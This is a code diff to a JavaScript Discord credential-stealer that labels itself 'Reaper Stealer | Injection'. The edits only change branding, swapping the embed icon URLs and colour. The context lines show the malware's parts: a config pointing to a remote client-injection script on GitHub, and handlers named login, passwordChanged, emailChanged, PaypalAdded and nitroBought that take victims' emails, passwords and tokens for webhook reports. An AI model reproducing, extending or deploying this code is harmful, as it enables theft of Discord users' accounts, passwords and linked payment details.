@@ -12,8 +12,8 @@ const config = {
   ping_on_run: true, 
   ping_val: '@everyone',
   embed_name: 'Reaper Stealer | Injection', 
-  embed_icon: 'https://cdn.discordapp.com/attachments/1059829665268768898/1084502872135315486/Picsart_22-10-09_19-38-18-617.jpg'.replace(/ /g, '%20'), 
-  embed_color: 2895667, 
+  embed_icon: 'https://cdn.discordapp.com/attachments/1263395161266847809/1263404911031488562/reaper.png'.replace(/ /g, '%20'), 
+  embed_color: 0x812118, 
   injection_url: 'https://raw.githubusercontent.com/AizenWo/Discord-Injection/main/index.js', 
   /**
    
@@ -681,7 +681,7 @@ const login = async (email, password, token) => {
         },
         footer: {
             text: 'Reaper Inject�on | Ba�Edemezsiniz ',
-            icon_url: "https://cdn.discordapp.com/attachments/1059829665268768898/1084502872135315486/Picsart_22-10-09_19-38-18-617.jpg"
+            icon_url: "https://cdn.discordapp.com/attachments/1263395161266847809/1263404911031488562/reaper.png"
         },
       },
     ],
@@ -724,7 +724,7 @@ const passwordChanged = async (oldpassword, newpassword, token) => {
         },
         footer: {
             text: 'Reaper Inject�on | Ba�Edemezsiniz',
-            icon_url: "https://cdn.discordapp.com/attachments/1059829665268768898/1084502872135315486/Picsart_22-10-09_19-38-18-617.jpg"
+            icon_url: "https://cdn.discordapp.com/attachments/1263395161266847809/1263404911031488562/reaper.png"
         },
       },
     ],
@@ -767,7 +767,7 @@ const emailChanged = async (email, password, token) => {
         },
         footer: {
             text: 'Reaper Inject�on | Ba�Edemezsiniz',
-            icon_url: "https://cdn.discordapp.com/attachments/1059829665268768898/1084502872135315486/Picsart_22-10-09_19-38-18-617.jpg"
+            icon_url: "https://cdn.discordapp.com/attachments/1263395161266847809/1263404911031488562/reaper.png"
         },
       },
     ],
@@ -810,7 +810,7 @@ const PaypalAdded = async (token) => {
         },
         footer: {
             text: 'Reaper Inject�on | Ba�Edemezsiniz',
-            icon_url: "https://cdn.discordapp.com/attachments/1059829665268768898/1084502872135315486/Picsart_22-10-09_19-38-18-617.jpg"
+            icon_url: "https://cdn.discordapp.com/attachments/1263395161266847809/1263404911031488562/reaper.png"
         },
       },
     ],
@@ -898,7 +898,7 @@ const nitroBought = async (token) => {
         },
         footer: {
             text: 'Reaper Inject�on | Ba�Edemezsiniz',
-            icon_url: "https://cdn.discordapp.com/attachments/1059829665268768898/1084502872135315486/Picsart_22-10-09_19-38-18-617.jpg"
+            icon_url: "https://cdn.discordapp.com/attachments/1263395161266847809/1263404911031488562/reaper.png"
         },
       },
     ],
